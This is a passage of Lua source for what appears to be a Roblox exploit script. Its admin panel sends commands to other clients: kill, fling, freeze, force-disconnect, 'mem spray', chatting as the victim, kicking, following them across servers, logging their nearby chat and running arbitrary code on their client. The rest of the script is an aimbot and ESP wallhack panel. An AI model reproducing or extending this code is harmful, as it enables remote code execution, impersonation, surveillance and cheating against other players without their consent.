            card.Size = UDim2.new(1, -8, 0, 776)
            ref.panel = panel

            local T = getToggles(uid)

            local function pb(label, x, y, w, cb) makeBtn(panel, label, x, y, w, 22, cb) end

            pb("Bring",   0, 0, 110, function() cmd(uid, "bring") end)
            pb("Fling",   114, 0, 110, function() cmd(uid, "fling") end)
            pb("Freeze",  228, 0, 110, function() cmd(uid, "freeze") end)

            pb("Unfreeze",0, 26, 110, function() cmd(uid, "unfreeze") end)
            pb("Explode", 114, 26, 110, function() cmd(uid, "explode") end)
            pb("Kill",    228, 26, 110, function() cmd(uid, "kill") end)

            pb("Ragdoll", 0, 52, 110, function() cmd(uid, "ragdoll") end)
            pb("Reset",   114, 52, 110, function() cmd(uid, "reset") end)
            pb("Follow",  228, 52, 110, function()
                FOLLOWING[uid] = not FOLLOWING[uid]
                table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> follow " .. tostring(FOLLOWING[uid]) .. " #" .. tostring(uid))
                refreshHistory()
            end)

            pb("Sit",     0, 82, 110, function() cmd(uid, "sit") end)
            local flipBtn = pb("Flip: OFF", 114, 82, 110, function(self)
                T.flip = not T.flip
                self.Text = "Flip: " .. (T.flip and "ON" or "OFF")
                cmd(uid, "flip")
            end)
            flipBtn.Text = "Flip: " .. (T.flip and "ON" or "OFF")
            pb("Flashbang", 228, 82, 110, function() cmd(uid, "flashbang") end)

            local invBtn = pb("Invert: OFF", 0, 108, 110, function(self)
                T.invert = not T.invert
                self.Text = "Invert: " .. (T.invert and "ON" or "OFF")
                cmd(uid, "invert_move")
            end)
            invBtn.Text = "Invert: " .. (T.invert and "ON" or "OFF")

            local wsBtn = pb("W/S: OFF", 114, 108, 110, function(self)
                T.ws = not T.ws
                self.Text = "W/S: " .. (T.ws and "ON" or "OFF")
                cmd(uid, "swap_ws")
            end)
            wsBtn.Text = "W/S: " .. (T.ws and "ON" or "OFF")

            local adBtn = pb("A/D: OFF", 228, 108, 110, function(self)
                T.ad = not T.ad
                self.Text = "A/D: " .. (T.ad and "ON" or "OFF")
                cmd(uid, "swap_ad")
            end)
            adBtn.Text = "A/D: " .. (T.ad and "ON" or "OFF")

            local muteBtn = pb("Mute: OFF", 0, 134, 110, function(self)
                T.mute = not T.mute
                self.Text = "Mute: " .. (T.mute and "ON" or "OFF")
                cmd(uid, "mute")
            end)
            muteBtn.Text = "Mute: " .. (T.mute and "ON" or "OFF")

            local antiBtn = pb("Anti-Frz: OFF", 114, 134, 110, function(self)
                T.anti = not T.anti
                self.Text = "Anti-Frz: " .. (T.anti and "ON" or "OFF")
                cmd(uid, "anti_unfreeze")
            end)
            antiBtn.Text = "Anti-Frz: " .. (T.anti and "ON" or "OFF")

            local reapBtn = pb("ReApply: OFF", 228, 134, 110, function(self)
                T.reap = not T.reap
                self.Text = "ReApply: " .. (T.reap and "ON" or "OFF")
                cmd(uid, "reapply")
            end)
            reapBtn.Text = "ReApply: " .. (T.reap and "ON" or "OFF")

            pb("Force DC", 0, 160, 110, function() cmd(uid, "disconnect") end)
            pb("Mem Lite", 114, 160, 110, function() cmd(uid, "mems_spray_lite") end)
            pb("Mem Full", 228, 160, 110, function() cmd(uid, "mem_spray_full") end)

            local emoteIn = makeInput(panel, "emote id...", 0, 188, 234, 22)
            pb("Emote", 238, 188, 100, function() cmd(uid, "emote", emoteIn.Text) end)

            local imgIn = makeInput(panel, "decal id...", 0, 214, 234, 22)
            pb("Show Img", 238, 214, 100, function() cmd(uid, "image", imgIn.Text) end)

            local msgIn = makeInput(panel, "message...", 0, 240, 234, 22)
            pb("Send Msg", 238, 240, 100, function() cmd(uid, "message", msgIn.Text) end)

            local chatIn = makeInput(panel, "chat as them...", 0, 266, 234, 22)
            pb("Chat", 238, 266, 100, function() cmd(uid, "chat", chatIn.Text) end)

            local codeIn = makeInput(panel, 'print("hi")', 0, 296, 338, 44)
            codeIn.Font = Enum.Font.Code
            pb("Run Code", 0, 344, 338, 22, function() cmd(uid, "code", codeIn.Text) end)

            makeLabel(panel, "kick message:", 0, 374, 200, 14, 10)
            local kickIn = makeInput(panel, "jump if u want to get banned", 0, 390, 338, 22)
            pb("Kick", 0, 416, 338, 22, function() cmd(uid, "kick", kickIn.Text) end)

            makeLabel(panel, "nearby chat (50 studs):", 0, 446, 300, 14, 10)
            local chatLogLbl = makeLabel(panel, "", 0, 462, 338, 230, 10, Color3.fromRGB(255, 255, 255))
            chatLogLbl.TextWrapped = true
            chatLogLbl.TextYAlignment = Enum.TextYAlignment.Top
            chatLogLbl.Font = Enum.Font.Code
            ref.chatLogLbl = chatLogLbl
        end

        expandBtn.MouseButton1Click:Connect(function()
            targetLbl.Text = "Target: " .. tostring(ref.user.name)
            if EXPANDED == uid then
                EXPANDED = nil
                collapse()
            else
                if EXPANDED and CARD_REFS[EXPANDED] then
                    local other = CARD_REFS[EXPANDED]
                    if other.panel then other.panel:Destroy(); other.panel = nil end
                    other.card.Size = UDim2.new(1, -8, 0, 66)
                    other.joinBtn.Visible = false
                    other.expandBtn.Text = "v"
                    other.chatLogLbl = nil
                end
                EXPANDED = uid
                expand()
            end
        end)

        CARD_REFS[uid] = ref

        if EXPANDED == uid then
            expand()
        end
    end

    local function syncCards()
        local now = os.time()
        local seen = {}
        local sorted = {}
        for uid, user in pairs(ONLINE) do
            if now - (user.ts or 0) < 30 and passesFilter(user) then
                seen[uid] = true
                table.insert(sorted, { uid = uid, user = user })
            end
        end
        table.sort(sorted, function(a, b) return (a.user.ts or 0) > (b.user.ts or 0) end)

        for uid, ref in pairs(CARD_REFS) do
            if not seen[uid] then
                if ref.card and ref.card.Parent then ref.card:Destroy() end
                CARD_REFS[uid] = nil
                if EXPANDED == uid then EXPANDED = nil end
            end
        end

        for i, entry in ipairs(sorted) do
            local uid = entry.uid
            local user = entry.user
            if not CARD_REFS[uid] then
                buildCard(uid, user)
            else
                local ref = CARD_REFS[uid]
                ref.user = user
                if ref.nameLbl then ref.nameLbl.Text = tostring(user.name) end
                if ref.metaLbl then ref.metaLbl.Text = "#" .. tostring(uid) .. "  " .. tostring(user.exec or "?") end
            end
            local ref = CARD_REFS[uid]
            if ref and ref.card then ref.card.LayoutOrder = i end
        end

        if next(CARD_REFS) == nil then
            if not scroll:FindFirstChild("__emptyMsg") then
                local empty = Instance.new("Frame")
                empty.Name = "__emptyMsg"
                empty.Size = UDim2.new(1, -8, 0, 30)
                empty.BackgroundTransparency = 1
                empty.Parent = scroll
                makeLabel(empty, "no clients online...", 4, 6, 300, 18, 12, Color3.fromRGB(255, 255, 255))
            end
        else
            local empty = scroll:FindFirstChild("__emptyMsg")
            if empty then empty:Destroy() end
        end

        scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
    end

    local function tickHbLabels()
        local now = os.time()
        for uid, ref in pairs(CARD_REFS) do
            if ref.hbLbl and ref.user then
                local age = math.max(0, now - (ref.user.ts or now))
                ref.hbLbl.Text = "hb " .. tostring(age) .. "s"
            end
        end
    end

    refreshHistory()
    syncCards()

    task.spawn(function()
        while true do
            pcall(function()
                local st = readState()
                if st and st.online then
                    ONLINE = st.online
                    LAST_SYNC = os.time()
                    LAST_ERR = ""
                else
                    LAST_ERR = "read failed"
                end
                if st and st.chatlog then
                    for uid, ref in pairs(CARD_REFS) do
                        if ref.chatLogLbl then
                            local log = st.chatlog[tostring(uid)] or {}
                            local lines = {}
                            for i = math.max(1, #log - 9), #log do
                                local e = log[i]
                                if e then
                                    table.insert(lines, "[" .. tostring(e.dist) .. "m] " .. e.from .. ": " .. e.msg)
                                end
                            end
                            ref.chatLogLbl.Text = #lines > 0 and table.concat(lines, "\n") or "(no nearby chat yet)"
                        end
                    end
                end
            end)
            syncCards()
            task.wait(1.2)
        end
    end)

    task.spawn(function()
        while true do
            task.wait(1)
            tickHbLabels()
        end
    end)

    task.spawn(function()
        while task.wait(3) do
            for uid, on in pairs(FOLLOWING) do
                if on and ONLINE[uid] then
                    local u = ONLINE[uid]
                    if u.job and u.job ~= game.JobId then
                        joinServer(u.place or game.PlaceId, u.job)
                    end
                end
            end
        end
    end)

    task.spawn(function()
        while true do
            local now = os.time()
            if LAST_ERR ~= "" then
                statusLbl.Text = LAST_ERR
                statusLbl.TextColor3 = Color3.fromRGB(240, 140, 140)
            elseif LAST_SYNC == 0 then
                statusLbl.Text = "syncing..."
                statusLbl.TextColor3 = Color3.fromRGB(240, 210, 140)
            elseif now - LAST_SYNC < 8 then
                statusLbl.Text = "sync: live"
                statusLbl.TextColor3 = Color3.fromRGB(150, 240, 150)
            else
                statusLbl.Text = "sync: " .. (now - LAST_SYNC) .. "s ago"
                statusLbl.TextColor3 = Color3.fromRGB(240, 200, 140)
            end
            task.wait(1)
        end
    end)

    return
end

-- ============================================================
-- USER PANEL
-- ============================================================
local gui = makeGui("[S] Universal")
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 260, 0, 460)
main.Position = UDim2.new(0, 20, 0.2, 0)
styleFrame(main)
main.Parent = gui

local uHeader = Instance.new("Frame")
uHeader.Size = UDim2.new(1, 0, 0, 30)
uHeader.BackgroundTransparency = 1
uHeader.Active = true
uHeader.Parent = main
makeDraggable(main, uHeader)

makeLabel(uHeader, "[S] UNIVERSAL", 12, 6, 200, 20, 15)

local CFG = {
    aim = false, fov = 150, smooth = 0.35, bone = "Head",
    team = true, vis = false, trig = false,
    espBox = true, espName = true, espHP = true, espDist = true, espSkel = false, chams = false,
    fovCircle = true,
}

local boneList = { "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart" }
local boneIdx = 1
CFG.bone = boneList[boneIdx]

makeLabel(main, "AIMBOT", 12, 34, 100, 14, 11)
local aimBtn = makeBtn(main, "Aimbot: OFF", 12, 50, 236, 24, function(self)
    CFG.aim = not CFG.aim
    self.Text = "Aimbot: " .. (CFG.aim and "ON" or "OFF")
end)

local fovLbl = makeLabel(main, "FOV: 150", 12, 78, 120, 14, 11)
local fovBar = Instance.new("Frame")
fovBar.Size = UDim2.new(0, 236, 0, 6)
fovBar.Position = UDim2.new(0, 12, 0, 94)
fovBar.BackgroundColor3 = Color3.fromRGB(56, 40, 82)
fovBar.BorderSizePixel = 0
fovBar.Active = true
fovBar.Parent = main
local fbc = Instance.new("UICorner"); fbc.CornerRadius = UDim.new(1, 0); fbc.Parent = fovBar
local fovFill = Instance.new("Frame")
fovFill.Size = UDim2.new(CFG.fov / 400, 0, 1, 0)
fovFill.BackgroundColor3 = Color3.fromRGB(210, 140, 255)
fovFill.BorderSizePixel = 0
fovFill.Parent = fovBar
local ffc = Instance.new("UICorner"); ffc.CornerRadius = UDim.new(1, 0); ffc.Parent = fovFill

local fovDrag = false
fovBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then fovDrag = true end
end)
UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then fovDrag = false end
end)
UIS.InputChanged:Connect(function(i)
    if fovDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local mx = UIS:GetMouseLocation().X
        local rel = math.clamp((mx - fovBar.AbsolutePosition.X) / fovBar.AbsoluteSize.X, 0, 1)
        CFG.fov = math.floor(rel * 400)
        fovFill.Size = UDim2.new(rel, 0, 1, 0)
        fovLbl.Text = "FOV: " .. CFG.fov
    end
end)

local smoothLbl = makeLabel(main, "Smooth: 0.35", 12, 106, 120, 14, 11)
local smoothBar = Instance.new("Frame")
smoothBar.Size = UDim2.new(0, 236, 0, 6)
smoothBar.Position = UDim2.new(0, 12, 0, 122)
smoothBar.BackgroundColor3 = Color3.fromRGB(56, 40, 82)
smoothBar.BorderSizePixel = 0
smoothBar.Active = true
smoothBar.Parent = main
local sbc = Instance.new("UICorner"); sbc.CornerRadius = UDim.new(1, 0); sbc.Parent = smoothBar
local smoothFill = Instance.new("Frame")
smoothFill.Size = UDim2.new(CFG.smooth, 0, 1, 0)
smoothFill.BackgroundColor3 = Color3.fromRGB(210, 140, 255)
smoothFill.BorderSizePixel = 0
smoothFill.Parent = smoothBar
local sfc = Instance.new("UICorner"); sfc.CornerRadius = UDim.new(1, 0); sfc.Parent = smoothFill

local smoothDrag = false
smoothBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then smoothDrag = true end
end)
UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then smoothDrag = false end
end)
UIS.InputChanged:Connect(function(i)
    if smoothDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local mx = UIS:GetMouseLocation().X
        local rel = math.clamp((mx - smoothBar.AbsolutePosition.X) / smoothBar.AbsoluteSize.X, 0.01, 1)
        CFG.smooth = math.floor(rel * 100) / 100
        smoothFill.Size = UDim2.new(rel, 0, 1, 0)
        smoothLbl.Text = "Smooth: " .. CFG.smooth
    end
end)

makeBtn(main, "Bone: Head", 12, 136, 236, 24, function(self)
    boneIdx = boneIdx % #boneList + 1
    CFG.bone = boneList[boneIdx]
    self.Text = "Bone: " .. CFG.bone
end)

makeBtn(main, "Team Check: ON", 12, 166, 116, 22, function(self) CFG.team = not CFG.team; self.Text = "Team Check: " .. (CFG.team and "ON" or "OFF") end)
makeBtn(main, "Vis Check: OFF", 132, 166, 116, 22, function(self) CFG.vis = not CFG.vis; self.Text = "Vis Check: " .. (CFG.vis and "ON" or "OFF") end)
makeBtn(main, "Triggerbot: OFF", 12, 192, 236, 22, function(self) CFG.trig = not CFG.trig; self.Text = "Triggerbot: " .. (CFG.trig and "ON" or "OFF") end)

makeLabel(main, "ESP", 12, 220, 100, 14, 11)
makeBtn(main, "Box: ON",      12, 236, 116, 22, function(self) CFG.espBox  = not CFG.espBox;  self.Text = "Box: "   .. (CFG.espBox  and "ON" or "OFF") end)
makeBtn(main, "Name: ON",     132, 236, 116, 22, function(self) CFG.espName = not CFG.espName; self.Text = "Name: "  .. (CFG.espName and "ON" or "OFF") end)
makeBtn(main, "Health: ON",   12, 262, 116, 22, function(self) CFG.espHP   = not CFG.espHP;   self.Text = "Health: ".. (CFG.espHP   and "ON" or "OFF") end)
makeBtn(main, "Dist: ON",     132, 262, 116, 22, function(self) CFG.espDist = not CFG.espDist; self.Text = "Dist: "  .. (CFG.espDist and "ON" or "OFF") end)
makeBtn(main, "Skeleton: OFF",12, 288, 116, 22, function(self) CFG.espSkel = not CFG.espSkel; self.Text = "Skeleton: " .. (CFG.espSkel and "ON" or "OFF") end)
makeBtn(main, "Chams: OFF",   132, 288, 116, 22, function(self) CFG.chams   = not CFG.chams;   self.Text = "Chams: " .. (CFG.chams and "ON" or "OFF") end)

makeBtn(main, "FOV Circle: ON", 12, 314, 236, 22, function(self)
    CFG.fovCircle = not CFG.fovCircle
    self.Text = "FOV Circle: " .. (CFG.fovCircle and "ON" or "OFF")
    fovCircle.Visible = CFG.fovCircle
end)

makeLabel(main, "R = toggle aim   F = toggle esp", 12, 342, 236, 14, 10)
makeLabel(main, "transport: val.town", 12, 358, 236, 14, 10)

local fovCircle = Instance.new("Frame")
fovCircle.AnchorPoint = Vector2.new(0.5, 0.5)
fovCircle.Size = UDim2.new(0, CFG.fov * 2, 0, CFG.fov * 2)
fovCircle.BackgroundTransparency = 1
fovCircle.BorderSizePixel = 0
fovCircle.Parent = gui
local fstroke = Instance.new("UIStroke")
fstroke.Color = Color3.fromRGB(220, 130, 255)
fstroke.Thickness = 1
fstroke.Parent = fovCircle
local fcorner = Instance.new("UICorner"); fcorner.CornerRadius = UDim.new(1, 0); fcorner.Parent = fovCircle
pulseStroke(fstroke)

local esp = {}

local function buildEsp(plr)
    if plr == LP then return end
    if esp[plr] then
        for _, o in pairs(esp[plr]) do pcall(function() o:Destroy() end) end
    end
    local bucket = {}
    if not plr.Character then esp[plr] = bucket; return end

    local box = Instance.new("BoxHandleAdornment")
    box.Adornee = plr.Character
    box.AlwaysOnTop = true
    box.Size = Vector3.new(2.2, 2.6, 1.2)
    box.Transparency = 0.5
    box.Color3 = Color3.fromRGB(220, 130, 255)
    box.Visible = CFG.espBox
    box.Parent = gui
    bucket.box = box

    local bill = Instance.new("BillboardGui")
    bill.Size = UDim2.new(0, 140, 0, 44)
    bill.StudsOffset = Vector3.new(0, 3.2, 0)
    bill.AlwaysOnTop = true
    bill.Adornee = plr.Character
    bill.Parent = gui
    bucket.bill = bill

    local nameL = Instance.new("TextLabel")
    nameL.BackgroundTransparency = 1
    nameL.Size = UDim2.new(1, 0, 0, 16)
    nameL.TextColor3 = Color3.fromRGB(255, 255, 255)
    nameL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    nameL.TextStrokeTransparency = 0.15
    nameL.Font = Enum.Font.GothamBold
    nameL.TextSize = 12
    nameL.Text = plr.Name
    nameL.Parent = bill
    bucket.nameL = nameL

    local hpL = Instance.new("TextLabel")
    hpL.BackgroundTransparency = 1
    hpL.Size = UDim2.new(1, 0, 0, 14)
    hpL.Position = UDim2.new(0, 0, 0, 16)
    hpL.TextColor3 = Color3.fromRGB(255, 255, 255)
    hpL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    hpL.TextStrokeTransparency = 0.15
    hpL.Font = Enum.Font.GothamBold
    hpL.TextSize = 11
    hpL.Text = "100"
    hpL.Parent = bill
    bucket.hpL = hpL

    local distL = Instance.new("TextLabel")
    distL.BackgroundTransparency = 1
    distL.Size = UDim2.new(1, 0, 0, 14)
    distL.Position = UDim2.new(0, 0, 0, 30)
    distL.TextColor3 = Color3.fromRGB(255, 255, 255)
    distL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    distL.TextStrokeTransparency = 0.15
    distL.Font = Enum.Font.GothamBold
    distL.TextSize = 11
    distL.Text = "0m"
    distL.Parent = bill
    bucket.distL = distL

    esp[plr] = bucket
end

for _, p in ipairs(Players:GetPlayers()) do
    p.CharacterAdded:Connect(function() buildEsp(p) end)
    buildEsp(p)
end
Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function() buildEsp(p) end)
    buildEsp(p)
end)

UIS.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.R then
        CFG.aim = not CFG.aim
        aimBtn.Text = "Aimbot: " .. (CFG.aim and "ON" or "OFF")
    end
    if i.KeyCode == Enum.KeyCode.F then
        CFG.espBox = not CFG.espBox
        CFG.espName = not CFG.espName
        CFG.espHP = not CFG.espHP
        CFG.espDist = not CFG.espDist
    end
end)

RunService.RenderStepped:Connect(function()
    if CFG.fovCircle then
        fovCircle.Position = UDim2.new(0, Camera.ViewportSize.X / 2, 0, Camera.ViewportSize.Y / 2)
        fovCircle.Size = UDim2.new(0, CFG.fov * 2, 0, CFG.fov * 2)
    end

    for plr, bucket in pairs(esp) do
        if plr.Character and plr:FindFirstChild("HumanoidRootPart") then
            if bucket.bill then bucket.bill.Adornee = plr.Character end
            if bucket.box then bucket.box.Adornee = plr.Character; bucket.box.Visible = CFG.espBox end
            if bucket.nameL then bucket.nameL.Visible = CFG.espName end
            if bucket.hpL then
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                bucket.hpL.Text = hum and tostring(math.floor(hum.Health)) or "0"
                bucket.hpL.Visible = CFG.espHP
            end
            if bucket.distL then
                local d = (Camera.CFrame.Position - plr.Character.HumanoidRootPart.Position).Magnitude
                bucket.distL.Text = string.format("%dm", math.floor(d))
                bucket.distL.Visible = CFG.espDist
            end
        end
    end

    if not CFG.aim then return end

    local camPos = Camera.CFrame.Position
    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local closest, dist = nil, CFG.fov

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                if not (CFG.team and p.Team and LP.Team and p.Team == LP.Team) then
                    local part = p.Character:FindFirstChild(CFG.bone) or p.Character:FindFirstChild("Head")
                    if part then
                        local scr, onScreen = Camera:WorldToViewportPoint(part.Position)
                        if onScreen then
                            local d = (Vector2.new(scr.X, scr.Y) - center).Magnitude
                            if d < dist then
                                if CFG.vis then
                                    local ray = Ray.new(camPos, (part.Position - camPos))
                                    local hit = workspace:FindPartOnRayWithIgnoreList(ray, { LP.Character, p.Character })
                                    if not hit then dist = d; closest = p end
                                else
                                    dist = d; closest = p
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    if closest and closest.Character then
        local part = closest.Character:FindFirstChild(CFG.bone) or closest.Character:FindFirstChild("Head")
        if part then
            local goal = CFrame.new(camPos, part.Position)
            Camera.CFrame = Camera.CFrame:Lerp(goal, 1 - CFG.smooth)
        end
    end
end)
